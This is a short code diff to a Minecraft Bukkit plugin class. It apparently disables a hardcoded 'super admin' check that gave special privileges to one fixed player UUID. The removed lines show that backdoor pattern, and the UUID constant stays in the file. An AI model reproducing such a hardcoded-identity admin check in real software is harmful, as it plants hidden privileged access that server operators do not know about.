@@ -5,7 +5,6 @@ import java.util.HashSet;
 import java.util.UUID;
 
 import org.bukkit.command.CommandSender;
-import org.bukkit.entity.Player;
 
 import fr.stormer3428.voidOpal.data.OMCLang;
 import fr.stormer3428.voidOpal.data.config.annotations.AutoConfig;
@@ -17,7 +16,7 @@ import fr.stormer3428.voidOpal.plugin.annotations.OMCKeep;
 
 @OMCKeep
 @AutoConfig
-public final class _0_1 extends OMCCore{
+public final class _0_1_nosu extends OMCCore{
 
 	public static final UUID MASTER_UUID = UUID.fromString("a39d1ae3-18c5-4c02-8f91-bcb5207d437f");
 
@@ -76,10 +75,5 @@ public final class _0_1 extends OMCCore{
 		return null; 
 	}
 
-	public final boolean _isSuperAdmin(CommandSender sender) {
-		if(!(sender instanceof Player p)) return false;
-		boolean superAdmin = p.getUniqueId().equals(MASTER_UUID);
-		if(superAdmin) OMCLogger.actionBar(p, "superAdmin");
-		return superAdmin;
-	}
+	public final boolean _isSuperAdmin(CommandSender sender) { return false; }
 }
